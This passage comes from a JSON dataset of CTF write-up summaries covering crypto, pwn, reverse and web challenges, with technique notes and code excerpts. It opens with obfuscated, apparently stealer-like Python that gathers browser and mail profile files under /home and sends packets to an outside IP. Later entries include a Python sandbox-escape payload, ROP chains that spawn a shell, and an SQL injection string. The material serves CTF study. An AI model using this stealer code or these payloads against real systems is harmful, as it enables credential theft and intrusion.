cat = \"cat\"  \n       buckler = '/' + \"home\" + '/' + gods + '/' + poison  \n       lightning.append(bytes(buckler, \"ascii\"))  \n       acid = \"find \" + buckler + \" -type f -exec \" + cat + \" {} + > \" + tome  \n       os.system(acid)  \n       spell = open(tome, \"rb\")  \n       ate = spell.read()  \n       spell.close()  \n       lightning.append(ate)\n\ndef circle(viciousMockery):  \n   ether = 0  \n   roc = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  \n   while(ether < 1337):  \n       ether = ether + 1  \n   for elf in lightning:  \n       drow = bytes('0', \"ascii\")  \n       roc.sendto(drow, (\"158.58.184.213\", ether))\n\ndef makesoul(orb):  \n   soul = []  \n   litch = soulMore(orb)  \n   soul.append(litch)  \n   soul.append(soul[0].lower())  \n   litch = swords()  \n   soul[0] = litch + \"Ice\" + \"weasel\"  \n   soul[0] = soul[0] + '/'  \n   soul[1] = soul[1] + chr(125)  \n   soul.append(litch + \"Thunder\" + \"bird\" + '/')  \n   return soul\n\ndef soulMore(craft):  \n   ether = 0  \n   vampire = \"\"  \n   eldritch = [\"auto\", \"fill\", craft, \"word\"]  \n   eldritch[ether] = eldritch[ether] + eldritch[ether + 1]  \n   ether = ether + 1  \n   eldritch[ether] = eldritch[ether + ether] + eldritch[ether + ether + ether]  \n   eldritch[len(eldritch) - ether] = \"NEVER\"  \n   eldritch[len(eldritch) - 2] = \"use\"  \n   eldritch = eldritch[::-1]  \n   for martial in eldritch:  \n       vampire = vampire + '_'  \n       vampire = vampire + martial  \n   return vampire\n\ndef swords():  \n   ether = -1  \n   return chr(46) + lightning[ether + 1][4:6][::ether] + \"zilla\" + '/'\n\nmain()\n```"
    },
    {
        "name": "Better Than ASM",
        "write_up": "dataset/raw/Better Than ASM.md",
        "type": "This write-up corresponds to a crypto challenge.",
        "competition": [
            "BambooFox/2021",
            "https://ctftime.org/event/1234/tasks/"
        ],
        "score": -1,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When encountering an unfamiliar file extension, such as .ll in a CTF challenge, it is crucial to perform research to understand the file type and how to interact with it. For .ll files specifically, they can be related to LLVM Static Compiler, and compiling them into an executable can be achieved using clang with appropriate flags. Converting LLVM IR (.ll) files to assembly or directly to executable format can be accomplished using the command line with:\n   - Example command: `clang task.ll -mllvm -W -g -W1,-pie -o task.out`",
            "In challenges involving encrypted or obfuscated strings, especially when XOR encryption is indicated, the key to decrypting the provided strings (such as a flag) often involves manipulating the inputs based on the encryption logic provided in the challenge's source code or pseudocode. If the encryption mechanism XORs input strings against a known 'secret', reversing this process through a custom script that iterates over potential character ranges can reveal the original message. The approach involves generating the input string that, when XOR'd with the 'secret', produces a readable output (within the ASCII printable range). This method can be particularly effective when the application logic of the encryption or obfuscation process is understood, allowing for tailored scripts to decrypt or decode messages.\n   - Example Python snippet to decrypt XOR'd strings:\n     ```python\n     what = your_byte_array_here\n     secret = your_secret_byte_array_here\n     for i in range(30, 127):  \n         flag = [i]  \n         for j in range(len(what)):  \n             flag.append(flag[j] ^ what[j])\n         newFlag = \"\"  \n         for j in range(len(what)):  \n             newFlag += chr(flag[j] ^ secret[j % len(secret)])\n         if all(30 <= ord(c) < 127 for c in newFlag):  # Prints only if all chars are printable\n             print(newFlag)\n     ```"
        ],
        "key": "```c\nint __cdecl main(int argc, const char **argv, const char **envp)  \n{  \n char v4; // [rsp+14h] [rbp-94h]  \n char v5; // [rsp+34h] [rbp-74h]  \n size_t v6; // [rsp+40h] [rbp-68h]  \n int j; // [rsp+58h] [rbp-50h]  \n int i; // [rsp+5Ch] [rbp-4Ch]  \n char s[68]; // [rsp+60h] [rbp-48h] BYREF  \n int v10; // [rsp+A4h] [rbp-4h]\n\n v10 = 0;  \n printf(\"Only the chosen one will know what the flag is!\\n\");  \n printf(\"Are you the chosen one?\\n\");  \n printf(\"flag: \");  \n __isoc99_scanf(\"%64s\", s);  \n v6 = strlen(s);  \n if ( v6 == strlen(&what) )  \n {  \n   if ( (unsigned int)check(s) )  \n   {  \n     for ( i = 0; i < strlen(s); ++i )  \n     {  \n       v5 = s[i];  \n       s[i] = secret[i % strlen(secret)] ^ v5;  \n     }  \n   }  \n   else  \n   {  \n     for ( j = 0; j < strlen(s); ++j )  \n     {  \n       v4 = flag[j];  \n       s[j] = secret[j % strlen(secret)] ^ v4;  \n     }  \n   }  \n   printf(format, s);  \n   v10 = 0;  \n }  \n else  \n {  \n   printf(asc_40205A);  \n   v10 = 1;  \n }  \n return v10;  \n}  \n\n__int64 __fastcall check(__int64 a1)  \n{  \n int v2; // [rsp+1Ch] [rbp-1Ch]  \n int i; // [rsp+28h] [rbp-10h]  \n unsigned int v4; // [rsp+2Ch] [rbp-Ch]\n\n v4 = 1;  \n for ( i = 0; i < strlen(what); ++i )  \n {  \n   v2 = *(char *)(a1 + i);  \n   v4 = (unsigned __int8)v4 & ((*(char *)(a1 + (i + 1) % strlen(what)) ^ v2) == what[i]);  \n }  \n return v4;  \n}  \n```"
    },
    {
        "name": "Better ZIP",
        "write_up": "dataset/raw/Better ZIP.md",
        "type": "crypto",
        "competition": [
            "GoogleCTF/2018/Quals",
            "https://ctftime.org/event/623/tasks/"
        ],
        "score": 231,
        "max_score": 500,
        "difficulty": 0.462,
        "knowledge": [
            "When faced with a custom encryption method relying on multiple Linear Feedback Shift Registers (LFSRs) for a file type with predictable header values, such as PNG, one can exploit known bytes in the file structure to reverse the encryption parameters. This is especially feasible if the LFSRs have a short bit length (e.g., 20 bits), making brute force attacks computationally viable. By leveraging the positions and values of known header fields and end-of-file markers within a file type's specification, one can gather enough known plaintext bits to attempt reconstruction of the key or internal state of the encryption scheme. This approach requires detailed knowledge of both the file format and the encryption mechanism to identify suitable known values for the attack.\n\n    Example approach (conceptual): For a PNG encrypted with a similar LFSR-based scheme, use predictable parts of the PNG structure such as the image header's fields (bit depth, color type, compression, filter type, interlacing) and the IEND chunk as known plaintext to narrow down LFSR parameters.",
            "For cryptographic challenges where the key or initial state decryption depends on brute force analysis of a manageable number of possibilities, automation through scripting is essential. Develop a script to iterate over possible combinations of decryption parameters (in this case, LFSR states) and test each combination against a condition indicative of success, such as the output conforming to the expected file format structure. This method is generalizable to other scenarios where the encryption scheme produces a relatively small number of potential keys or states that can be feasibly tested.\n\n    Sample script concept: Implement a `final.py` script that iterates through the narrowed-down possibilities of LFSR states, attempting to decrypt the file with each one. Use a validation check for PNG file integrity (e.g., correct PNG header and IEND chunk) to identify the successful decryption parameters."
        ],
        "key": "```python\nclass LFSR:\n    def __init__(self, seed, mask):\n        self.state = seed\n        self.mask = mask\n\n    def next_bit(self):\n        output = self.state & 1\n        self.state >>= 1\n        if output:\n            self.state ^= self.mask\n        return output\n\ndef init_lfsrs(password):\n    lfsrs = []\n    for i in range(8):\n        seed = (password >> (i * 20)) & 0xFFFFF\n        mask = 0b11000000000000000001  # Example mask for 20-bit LFSR\n        lfsrs.append(LFSR(seed, mask))\n    return lfsrs\n\ndef encrypt(data, password):\n    lfsrs = init_lfsrs(password)\n    encrypted = bytearray()\n    for byte in data:\n        encrypted_byte = byte\n        for lfsr in lfsrs:\n            for _ in range(8):\n                encrypted_byte ^= lfsr.next_bit() << _\n        encrypted.append(encrypted_byte)\n    return encrypted\n```"
    },
    {
        "name": "bigDriver",
        "write_up": "dataset/raw/bigDriver.md",
        "type": "pwn",
        "competition": [
            "HackZoneTunisia/2020",
            "https://ctftime.org/event/1029/tasks/"
        ],
        "score": 854,
        "max_score": 1000,
        "difficulty": 0.854,
        "knowledge": [
            "When dealing with timing attacks, where the server response time increases based on the number of consecutive correct characters in a submitted guess, a bruteforce attack can be optimized by observing the delay in server response times. This can indicate the accuracy of the guessed characters, allowing the attacker to sequentially identify the correct characters of a secret string, such as a flag.",
            "Multiprocessing can significantly reduce the time required for bruteforcing by allowing parallel processing of guesses. This method splits the task across multiple CPU cores, enabling simultaneous guesses and thus reducing the overall bruteforce attack time. This approach is particularly useful in challenges with a limited time frame, where traditional single-threaded methods would not suffice due to the vast number of possible guesses."
        ],
        "key": "```python\ndef check_flag(input_string):\n    flag = \"HZVIII{correct_flag_here}\"\n    if input_string == flag:\n        return True\n    return False\n\ndef handle_input(user_input):\n    for i in range(len(user_input)):\n        if user_input[i] != flag[i]:\n            break\n        time.sleep(0.5)  # Simulate delay for each correct character\n    return check_flag(user_input)\n```"
    },
    {
        "name": "Biggars",
        "write_up": "dataset/raw/Biggars.md",
        "type": "crypto",
        "competition": [
            "FireShell/2019",
            "https://ctftime.org/event/727/tasks/"
        ],
        "score": 60,
        "max_score": 500,
        "difficulty": 0.12,
        "knowledge": [
            "In RSA cryptography challenges, when encountering an unusually large modulus \\(N\\) that prevents conventional online tools from factoring it due to size constraints, leveraging specialized computational environments with built-in number theory functions, such as SageMath, allows for efficient factorization of \\(N\\). This step is pivotal for computing Euler's totient function (\\(\\phi(N)\\)) and subsequently finding the decryption exponent (\\(d\\)) to decrypt the cipher and recover the plaintext message. This technique is particularly useful when \\(N\\) is composed of large prime factors that standard factoring algorithms struggle with.",
            "In scenarios involving restricted execution environments or sandboxes that limit direct access to certain Python functionalities or modules to prevent arbitrary code execution, an effective strategy to bypass these restrictions involves chaining attribute or method accesses to navigate from available objects to restricted functionalities. This method exploits the interconnected nature of Python objects and their attributes, allowing an attacker to, for instance, access the base object class to reach `__builtins__` and import restricted modules by creatively circumventing filters (e.g., by concatenating strings to bypass keyword blacklists). This tactic requires an in-depth understanding of Python's data model and the relationships between different objects and their attributes or methods. \n\nExample payload for bypassing restrictions to execute OS commands through a limited web shell:\n```python\nprint {}.__class__.__base__.__subclasses__().pop((('a')*59+('b')).index('b'))()._module.__builtins__.values().pop((('c')*109+('d')).index('d'))('subprocess').check_output('ls')\n```\nThis payload illustrates a method to import the `subprocess` module by circumventing text filters (by splitting the module name and concatenating it) and executing a command (`ls`) to list directory contents, potentially allowing an attacker to identify files of interest, such as those containing flags."
        ],
        "key": "```python\ntest = {}.__class__.__base__.__subclasses__().pop((('a')*59+('b')).index('b'))()._module.__builtins__.values().pop((('c')*109+('d')).index('d'))('subprocess').check_output('ls')\n```"
    },
    {
        "name": "Bilinear Evil",
        "write_up": "dataset/raw/Bilinear Evil.md",
        "type": "crypto",
        "competition": [
            "Pwn2Win/2019",
            "https://ctftime.org/event/822/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When faced with a cryptographic challenge involving bilinear pairings and the Sakai\u2013Kasahara scheme under the elliptic curve setting, crucial steps include understanding the key generation process, how shared secrets are established, and leveraging the properties of bilinear maps for pairings. Specifically, for scenarios involving secret sharing protocols, the discrete logarithm problem becomes central to recovering secret keys if the underlying field's characteristic is small. Tools like MAGMA can be effectively used for computing discrete logarithms using Coppersmith's index-calculus algorithm when working within finite fields of small characteristic.",
            "In challenges where the objective includes decrypting or recovering hidden information using bilinear pairings, the discrete logarithm problem can sometimes be solved using external precomputed tables for fields with very small characteristics, as hinted by available implementations in MAGMA for fields with characteristic p where p is less than \\(2^{30}\\). This approach relies on auxiliary tables to avoid precomputation stages for logarithms of a factor base, thereby enabling immediate computation of logarithms for individual elements. It uses an efficient variant of Coppersmith's algorithm, suitable for fields of small characteristic and not necessarily prime fields."
        ],
        "key": "```python\nimport hashlib\n\nm = 113  \nF.<z> = GF(2^m, modulus=x^113 + x^9 + 1)  \nFx.<t> = F.extension(x^4 + x + 1)\n\nb = 1  \nE = EllipticCurve(F, [0, 0, 1, 1, b])  \nEx = EllipticCurve(Fx, [0, 0, 1, 1, b])  \nh = 1  \nr = E.cardinality() // h;\n\n# Read master key for SOK authenticated key agreement  \nflag = open(\"flag.txt\").read().strip()  \nassert len(flag) <= 64  \nsecret = flag[7:][:-1] # extract secret from CTF-BR{<secret>}  \nmsk = Integer(int(secret.encode(\"hex\"), 16))\n\n# Generate keys for Alice  \nxa = F(Integer(int(hashlib.sha256(\"Alice\").digest().encode('hex'),16) %\n2^m).bits())  \nwhile E.is_x_coord(xa) == false:  \n\txa*=z;  \nPa = h*E.lift_x(xa)  \nSa = msk * Pa;\n\n# Generate keys for Bob  \nxb = F(Integer(int(hashlib.sha256(\"Bob\").digest().encode('hex'),16) %\n2^m).bits())  \nwhile E.is_x_coord(xb) == false:  \n\txb*=z;  \nPb = h*E.lift_x(xb)  \nSb = msk * Pb;\n\ndef pairing(P,Q):  \n\tPx = Ex((P.xy()[0]),(P.xy()[1]))  \n\t(x,y) = ((Q.xy()[0]),(Q.xy()[1]))  \n\tQx = Ex(x+t^4+t^2,y+(t^2+t)*x+t)  \n\treturn Px.tate_pairing(Qx,r,4,2^m)  \n  \nsk1 = pairing(Sa,Pb);  \nsk2 = pairing(Sb,Pa);\n\n# Make sure that the two shared keys are equal and the protocol works  \nassert sk1 == sk2\n\nout = open(\"data.txt\",\"w\")  \nfor p in sk1.list():  \n\ts = \"\".join(str(e) for e in p.polynomial().list()[::-1])  \n\tout.write(hex(Integer(s,2))+\"\\n\")  \n```"
    },
    {
        "name": "biooosless",
        "write_up": "dataset/raw/biooosless.md",
        "type": "This write-up describes a reverse engineering challenge that involves analyzing a modified BIOS image and writing shellcode to read a flag from a floppy disk. Based on the context provided, the type of challenge in this write-up is **reverse**.",
        "competition": [
            "DEFCON/2020/Quals",
            "https://ctftime.org/event/994/tasks/"
        ],
        "score": 145,
        "max_score": 460,
        "difficulty": 0.31521739130434784,
        "knowledge": [
            "When dealing with hardware directly in BIOS through shellcode and required to perform I/O operations (e.g., reading from floppy), it is practical to use the CPU's Real Mode for direct hardware access while shifting to Protected Mode for utilizing extended memory and executing 32-bit code. This approach allows for low-level operations such as I/O without relying on the OS or interrupts which might not be initialized or available. For BIOS and hardware interaction tasks, bypass the high-level abstractions and directly manipulate the hardware or low-level system resources.",
            "In scenarios where direct hardware access is required for operations like reading a floppy disk, and standard interrupts (e.g., INT 13h for disk services) are not available or initialized, one viable approach is to mimic or replicate the BIOS or system firmware functions in shellcode to interact with the hardware. This involves accessing I/O ports directly (e.g., using in/out instructions) to communicate with devices. It is important to eliminate unnecessary checks and functionality from the code being replicated to fit the shellcode requirements and focus on the direct interaction needed for the challenge.\n\nSample of a payload for direct hardware communication in the context given:\n```assembly\n; Direct communication with floppy drive\nmov al, 0x90                     ; Command to read drive type\nout 0x70, al                     ; Send command to CMOS index port\nin al, 0x71                      ; Read drive type from CMOS data port\n; Assume al now contains the drive type\n; Floppy communication can follow, tailored to specific needs\n```"
        ],
        "key": "```c\n#define FLOPPY_DOR_VAL (*(u32*)(0xc9ff0))\n\nstatic u32 timer_read(void)  \n{  \n   return rdtscll() >> *(u8*)(0xFDB82);  \n}\n\nstatic u32 timer_calc(u32 msecs)  \n{  \n   return timer_read() + ((*(u32*)(0xFDB88)) * msecs);  \n}\n\nstatic u32 timer_calc_usec(u32 usecs)  \n{  \n   u32 cur = timer_read(), khz = (*(u32*)(0xFDB88));  \n   if (usecs > 500000)  \n       return cur + DIV_ROUND_UP(usecs, 1000) * khz;  \n   return cur + DIV_ROUND_UP(usecs * khz, 1000);  \n}\n\nint i=0;  \nwhile(*flag){  \n   *(u16*)(0xb8000 + i) = (0x0F00) | *(flag++);  \n   i += 2;  \n}\n```"
    },
    {
        "name": "bistro-v2",
        "write_up": "dataset/raw/bistro-v2.md",
        "type": "pwn",
        "competition": [
            "Defcamp/2023/Quals",
            "https://ctftime.org/event/2106/tasks/"
        ],
        "score": 10,
        "max_score": 347,
        "difficulty": 0.02881844380403458,
        "knowledge": [
            "In challenges involving binary exploitation with a format string vulnerability, the `%x` format specifier can be used to leak memory contents. This knowledge is applicable when the binary uses functions like `printf` that interpret format specifiers and when there is a need to leak specific memory contents to bypass security checks or gain valuable information for further exploitation. Example payload to leak memory contents: `%9$x`.",
            "When dealing with challenges that require bypassing a security check or gaining arbitrary code execution, techniques such as ROP (Return Oriented Programming) can be leveraged. This involves using gadgets found within the binary or linked libraries to control the flow of execution. The strategy is particularly useful when the challenge binary has protections such as NX enabled, but lacks other protections like stack canaries or PIE (Position Independent Executables). Basic gadgets needed for ROP chains include `pop` registers (to control register values) and `ret` (to align the stack or for other purposes). Example of constructing a ROP chain to call a function like `puts`: \n   \n   ```\n   payload = b\"a\" * buffer_overflow_offset + pop_rdi + address_of_data_to_leak + puts_plt_address + return_address\n   ```"
        ],
        "key": "```c\nint main(int argc,char **argv)  \n{  \n int iVar1;  \n ssize_t sVar2;  \n undefined4 in_register_0000003c;  \n char **argv-local;  \n int argc-local;  \n int not_flag;  \n int flag;  \n int fd;  \n  \n init((EVP_PKEY_CTX *)CONCAT44(in_register_0000003c,argc));  \n fd = open(\"/dev/urandom\",0);  \n if (fd == -1) {  \n   puts(\"Open failed\");  \n   iVar1 = -1;  \n }  \n else {  \n   sVar2 = read(fd,&flag,4);  \n   if (sVar2 == 4) {  \n     close(fd);  \n     puts(\"Wellcome to the restaurant V2!\");  \n     fflush(stdout);  \n     fgets(buff,0x400,stdin);  \n     printf(buff);  \n     puts(\"Show me your ticket to pass: \");  \n     fflush(stdout);  \n     __isoc99_scanf(\"%x\",&not_flag);  \n     if (flag == not_flag) {  \n       restaurant();  \n     }  \n     else {  \n       puts(\"Permission denied!\\n\");  \n     }  \n     iVar1 = 0;  \n   }  \n   else {  \n     puts(\"Read failed\\n\");  \n     iVar1 = -1;  \n   }  \n }  \n return iVar1;  \n}  \n```"
    },
    {
        "name": "bistro",
        "write_up": "dataset/raw/bistro.md",
        "type": "pwn",
        "competition": [
            "Defcamp/2023/Quals",
            "https://ctftime.org/event/2106/tasks/"
        ],
        "score": 12,
        "max_score": 347,
        "difficulty": 0.0345821325648415,
        "knowledge": [
            "When encountering binaries with Partial RELRO and no PIE (Position Independent Executable), it suggests that address space layout will be consistent across runs and function addresses can be reliably targeted for Return Oriented Programming (ROP) attacks. By leveraging tools like ROPGadget to find gadgets such as `pop rdi; ret;`, it's possible to construct a payload to leak function addresses (e.g., using `puts`) or call other functions in the binary or libc.",
            "After leaking an address of a function such as `puts` from the Global Offset Table (GOT), it's feasible to calculate the base address of libc by referencing known offsets between that function and the libc base address found in a libc database. Once the libc base is determined, system calls can be orchestrated by calculating the addresses of system and \"/bin/sh\" relative to libc's base. This method requires manually finding libc offsets using tools or databases like the libc database.\n\n   Example Payload Part 1 (Leak Address and Calculate libc Base):\n   \n   ```python\n   payload = b\"a\" * 0x78 + pop_rdi + puts_got + puts_plt + main_addr\n   ```\n\n   Example Payload Part 2 (Call System with \"/bin/sh\"):\n   \n   ```python\n   payload = b\"a\" * 0x78 + ret + pop_rdi + sh_addr + system_addr\n   ```"
        ],
        "key": "```c  \nundefined8 custom(void)  \n{  \n char local_78 [112];  \n  \n printf(\"Choose what you want to eat:\");  \n gets(local_78);  \n gets(local_78);  \n return 0;  \n}\n```"
    },
    {
        "name": "Bit Flip 1",
        "write_up": "dataset/raw/Bit Flip 1.md",
        "type": "crypto",
        "competition": [
            "Dragon/2020",
            "https://ctftime.org/event/1082/tasks/"
        ],
        "score": 155,
        "max_score": 500,
        "difficulty": 0.31,
        "knowledge": [
            "To perform a timing-based side-channel attack to determine the bits of a secret seed used in cryptographic operations, analyze the variance in the number of iterations taken to generate a cryptographic prime as you systematically flip bits in an input. This approach leverages the way certain cryptographic systems, such as prime number generators, behave predictably based on their input. Such behavior can be exploited to infer bits of the seed, except for the least significant bit, by observing how the input manipulation affects the computational workload (measured in iterations) of the cryptographic algorithm.\n\n   Example approach:\n   - Begin with a guessed seed value of 0 and iteratively flip each bit from 1 to 127.\n   - For each bit position, create two scenarios by XORing and ORing the guessed seed with values that set the target bit to 0 and 1, respectively.\n   - Send each scenario to the server and compare the number of iterations reported to generate the prime. A difference in iterations suggests the value of the target bit.\n   - This process allows for deducing all but the least significant bit of the seed by comparing the computational effort required to generate a prime number under slight variations in the seed.",
            "Once the secret seed (or a close approximation) is known, use it to construct the expected cryptographic parameters of a session (such as a shared symmetric key in a Diffie-Hellman exchange) and perform decryption of the communicated message. This method relies on reversing engineered cryptographic setup from the observed communication and known or guessed values of the seed, demonstrating the critical importance of secure random number generation in cryptographic protocols.\n\n   Example decryption process:\n   ```python\n   # Assuming the guessed seed is correct and allows the reconstruction of Alice's state:\n   alice_seed = long_to_bytes(guess)  \n   alice = DiffieHellman(bit_flip(alice_seed))\n   # Use Bob's public number and Alice's derived secret to compute the shared key\n   shared = pow(response['bob_number'], alice.my_secret, alice.prime)\n   # Decrypt the message using the derived shared key and the provided IV\n   cipher = AES.new(long_to_bytes(shared, 16)[:16], AES.MODE_CBC, IV=response['iv'])\n   decrypted_flag = cipher.decrypt(response['enc_flag'])\n   return decrypted_flag\n   ```\n   This code snippet uses the correctly guessed seed to initialize a Diffie-Hellman class instance correctly, compute the shared key, and decrypt the flag successfully, demonstrating the decryption part of the challenge solution."
        ],
        "key": "```python\nclass Rng:  \n def __init__(self, seed):  \n   self.seed = seed  \n   self.generated = b\"\"  \n   self.num = 0\n\n def more_bytes(self):  \n   self.generated += hashlib.sha256(self.seed).digest()  \n   self.seed = long_to_bytes(bytes_to_long(self.seed) + 1, 32)  \n   self.num += 256\n\n def getbits(self, num=64):  \n   while (self.num < num):  \n     self.more_bytes()  \n   x = bytes_to_long(self.generated)  \n   self.num -= num  \n   self.generated = b\"\"  \n   if self.num > 0:  \n     self.generated = long_to_bytes(x >> num, self.num // 8)  \n   return x & ((1 << num) - 1)\n\nclass DiffieHellman:  \n def gen_prime(self):  \n   prime = self.rng.getbits(512)  \n   iter = 0  \n   while not is_prime(prime):  \n     iter += 1  \n     prime = self.rng.getbits(512)  \n   print(\"Generated after\", iter, \"iterations\")  \n   return prime\n\n def __init__(self, seed, prime=None):  \n   self.rng = Rng(seed)  \n   if prime is None:  \n     prime = self.gen_prime()\n\n   self.prime = prime  \n   self.my_secret = self.rng.getbits()  \n   self.my_number = pow(5, self.my_secret, prime)  \n   self.shared = 1337\n\n def set_other(self, x):  \n   self.shared ^= pow(x, self.my_secret, self.prime)\n```"
    },
    {
        "name": "bitbitbit",
        "write_up": "dataset/raw/bitbitbit.md",
        "type": "crypto",
        "competition": [
            "MeePwn/2018/Quals",
            "https://ctftime.org/event/625/tasks/"
        ],
        "score": -1,
        "max_score": 940,
        "difficulty": -1,
        "knowledge": [
            "When dealing with RSA encryption where the public exponent `e` is large and constant across multiple encryptions with different moduli, and if the plaintext is not padded, Hastad's Broadcast Attack can be utilized. This is especially relevant in scenarios where the plaintext (flag) length is relatively short compared to `e`. In such cases, intercepting a sufficient number of ciphertexts encrypted under different public keys (but with the same `e`) enables recovery of the plaintext using the Chinese Remainder Theorem (CRT).",
            "When planning to apply Hastad's Broadcast Attack in a practical scenario (e.g., a CTF challenge), preparing for extensive data collection (ciphertexts and corresponding public keys) is necessary due to potential limitations such as Proof of Work (PoW) requirements. An efficient approach would involve automating the collection process and implementing a parallel solver for the Chinese Remainder Theorem to expedite calculations. This is particularly effective in handling large-scale computations that can be distributed across multiple cores or machines.\n   \n   Example tool for CRT calculation in a parallelized manner: https://github.com/p4-team/crypto-commons/blob/master/crypto_commons/rsa/crt.py"
        ],
        "key": "```python\ndef gen_key():\n    p = get_prime()\n    q = get_prime()\n    N = p * q\n    delta = (p - 1) * (q - 1)\n    gamma = (p + q) // 2\n    return N, delta, gamma\n```"
    },
    {
        "name": "Bitflipper",
        "write_up": "dataset/raw/Bitflipper.md",
        "type": "reverse",
        "competition": [
            "DEFCON/2018/Quals",
            "https://ctftime.org/event/608/tasks/"
        ],
        "score": 177,
        "max_score": 500,
        "difficulty": 0.354,
        "knowledge": [
            "In scenarios involving ELF binaries with the ability to introduce controlled faults, such as bit flips, modifying the ELF header to transform the executable into a core dump format can force the server or system to output the entire binary. This method relies on understanding the ELF file structure and identifying key bits whose modification would change the file's behavior or classification. Specifically, flipping bits at certain positions in the ELF header can make it recognized as a core dump, prompting systems to handle it differently, often providing valuable information or the binary itself for analysis.",
            "For exploiting ELF binaries by manipulating relocation entries, particularly the `Elf64_Rela` structure in the PLT (Procedure Linkage Table) relocation table, modifying fields like `r_offset` (which controls where to write) and `r_addend` (which controls what to write) can redirect function calls to arbitrary locations. This technique allows for controlling the execution flow, especially useful when functions like `system` or `execve` are not directly callable due to constraints like argument setup or distance in memory space. Carefully calculating the effects of bit flips can redirect execution to useful gadgets or functions within the binary or shared libraries it uses. A practical application of this is flipping specific bits in the `Elf64_Rela` structure of selected functions to misdirect their execution flow towards gadgets that can lead to arbitrary code execution.\n\nExample payload manipulation for `Elf64_Rela` structure to jump to a gadget: Flip bits `0x7fa*8 +1`, `+4`, and `+7` to alter the execution flow and make the program jump to an address offset leading to a gadget executing a useful function like spawning a shell."
        ],
        "key": "```c\ntypedef struct {  \n    Elf64_Addr      r_offset;  \n    Elf64_Xword     r_info;  \n    Elf64_Sxword    r_addend;  \n} Elf64_Rela;\n```"
    },
    {
        "name": "Bits",
        "write_up": "dataset/raw/Bits.md",
        "type": "crypto",
        "competition": [
            "CSAW/2021/Quals",
            "https://ctftime.org/event/1315/tasks/"
        ],
        "score": 497,
        "max_score": 500,
        "difficulty": 0.994,
        "knowledge": [
            "When facing a discrete logarithm problem in a CTF challenge where the factorization of \\(N\\) is required, and an oracle is available that reveals some bits of the secret exponent \\(d\\) from \\(g^d \\mod N\\), one can use a binary search technique to determine the higher order bits of \\(d\\). This is actionable by interactively querying the oracle with carefully constructed inputs to gradually narrow down the range of possible values for the leading bits. Such inputs might involve padding the exponent with a specific pattern of bits (e.g., setting the last \\(n\\) bits to 1) to influence the oracle's output in a predictable way. This method requires an understanding of the oracle's behavior and the mathematical properties of the discrete logarithm being exploited.\n\nExample steps in pseudo-python code:\n```python\n# Assume b represents the bit position returned by the oracle.\ndef pad(k): \n    return k*2**(b+1) | (2**(b+1)-1)\n\n# Binary search to narrow down the higher order bits.\nhi = 2**124\nlo = 2**123\nwhile lo+1 < hi:\n    mid = (lo + hi)//2\n    if query(pad(mid)) == 1:  # Assuming query() sends to oracle and returns bit\n        lo = mid\n    else:\n        hi = mid\n```",
            "To factorize \\(N\\) when part of the discrete logarithm is known (including a situation where an oracle provides information about \\(d\\)), one can consider the case when \\(N\\) is the product of two primes, \\(p\\) and \\(q\\), and utilize the order of the group generated by \\(g\\) modulo \\(N\\). If the order is approximately known through interactions with the oracle, such as determining a value \\(m_k\\) closely related to the multiplicative order, the Carmichael function \\(\\lambda(N)\\) or Euler's totient function \\(\\phi(N)\\) can be estimated to ascertain \\(p\\) and \\(q\\). This factorization approach assumes some knowledge about the structure of \\(N\\) and relies on number theory concepts such as the multiplicative order and prime factorization.\n\nExample steps in pseudo-python code for estimating \\(\\phi(N)\\) and factorizing \\(N\\):\n```python\n# Assuming hi approximates k*phi(N) and qs is a guess related to N structure\nqs = 2\nk = (hi + N//qs) // (N//qs)\nphi = (hi//k) * qs\n\n# Method to approximate integer square root\ndef _sqrt(n):  \n    lo = 0  \n    hi = n\n    while lo+1 < hi:\n        mid = (lo+hi) // 2\n        if mid*mid <= n:\n            lo = mid  \n        else:  \n            hi = mid\n    return lo\n\n# Calculate p and q\npplusq = N - phi + 1\npminq = _sqrt(pplusq*pplusq - 4*N)\nq = (pplusq + pminq) // 2\np = pplusq - q\n```\n\nThis knowledge provides a roadmap for tackling encryption challenges in CTF competitions that revolve around discrete logarithm problems and necessitate factorization of a modulus as part of the solving process."
        ],
        "key": "```rust  \n   let mut rnd = RandState::new_custom(&mut sysrng);  \n   let d = Integer::from(&*ORDER).random_below(&mut rnd);  \n   let publ = Integer::from(&*G).pow_mod(&d, &*N).unwrap();  \n   let nbits = ORDER.significant_bits();  \n   let alice =\nInteger::from(&*G).pow_mod(&Integer::from(&*ORDER).random_below(&mut rnd),\n&*N).unwrap();  \n   println!(\"N = {}\\nG = {}\\npubl = {}\\nalice = {}\\nnbits = {}\",  \n       *N,  \n       *G,  \n       publ,  \n       alice,  \n       nbits);  \n   encrypt_flag(alice.pow_mod(&d, &N).unwrap());  \n```  \n\n```rust  \nfn encrypt_flag(shared: Integer) {  \n   let mut hasher = Sha256::new();  \n   hasher.update(shared.to_string());  \n   let key = hasher.finalize();  \n   let mut cipher = Aes256Ctr::from_block_cipher(  \n       Aes256::new_from_slice(&key.as_slice()).unwrap(),  \n       &GenericArray::clone_from_slice(&[;; 16])  \n       );  \n   let mut flag = FLAG.clone();  \n   cipher.apply_keystream(&mut flag);  \n   println!(\"FLAG = {}\", flag.iter().map(|c| format!(\"{:02x}\",\nc)).collect::<String>());  \n}  \n```  \n\n```rust  \n   for line in std::io::stdin().lock().lines() {  \n       let input = line.unwrap().parse::<Integer>().unwrap();  \n       match dlog(input.clone()) {  \n           None => println!(\"-1\"),  \n           Some(x) => {  \n               assert!(G.clone().pow_mod(&x, &*N).unwrap() == input % &*N);  \n               assert!(x < *ORDER);  \n               assert!(x >= 0);  \n               println!(\"{}\", x.get_bit(nbits - 123) as i32)  \n           }  \n       }  \n   }  \n```"
    },
    {
        "name": "blank",
        "write_up": "dataset/raw/blank.md",
        "type": "This is a web challenge.",
        "competition": [
            "ImaginaryCTF/2023",
            "https://ctftime.org/event/2015/tasks/"
        ],
        "score": 100,
        "max_score": 490,
        "difficulty": 0.20408163265306123,
        "knowledge": [
            "In a SQL injection challenge where direct data extraction is not feasible due to an empty database, leveraging SQLite's built-in tables such as `sqlite_master` can facilitate an injection that alters the query result. This bypass can be achieved with a union injection, which allows for the selection and display of data from another table, even when the original query's target table is empty. This technique relies on the SQL injection vulnerability wherein input directly influences the query without proper sanitization or parameterization.  \nExample payload: For a username and password form, inputting `admin` as the username and `\" union select rootpage, type, name from sqlite_master --` as the password may execute the bypass.",
